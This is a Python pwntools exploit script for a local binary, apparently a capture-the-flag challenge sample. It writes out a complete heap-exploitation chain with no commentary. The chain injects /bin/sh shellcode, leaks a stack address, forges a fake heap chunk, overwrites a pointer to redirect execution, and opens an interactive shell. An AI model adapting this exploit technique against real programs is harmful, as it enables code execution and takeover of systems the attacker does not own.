from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/sample21')
p = process('./data/sample21')
shellcode = asm(shellcraft.amd64.linux.sh(), arch='amd64')

def leak_rbp_and_get_shellcode_addr(shellcode):
    payload = shellcode.ljust(48)
    p.sendafter(b'who are u?\n', payload)
    p.recvuntil(payload)
    rbp_addr = u64(p.recvn(6).ljust(8, b'\x00'))
    shellcode_addr = rbp_addr - 0x50
    print("shellcode_addr: ", hex(shellcode_addr))
    return shellcode_addr

def setup_fake_chunk(fake_chunk_addr):
    p.sendlineafter(b'give me your id ~~?\n', b'32')
    p.recvuntil(b'give me money~\n')
    data = p64(0) * 4 + p64(0) + p64(0x41)
    data = data.ljust(56, b'\x00') + p64(fake_chunk_addr)
    p.send(data)

def arbitrary_write(shellcode_addr):
    p.sendlineafter(b'choice : ', b'2')
    p.sendlineafter(b'choice : ', b'1')
    p.sendlineafter(b'long?', b'48')
    p.recvline()
    data = b'a' * 0x18 + p64(shellcode_addr)
    data = data.ljust(48, b'\x00')
    p.send(data)

def trigger_shell():
    p.sendlineafter(b'choice', b'3')

shellcode_addr = leak_rbp_and_get_shellcode_addr(shellcode)#step.1
fake_chunk_addr = shellcode_addr + 0x50 - 0x90;setup_fake_chunk(fake_chunk_addr)#step.2
arbitrary_write(shellcode_addr)#step.3
trigger_shell()#step.4
p.interactive()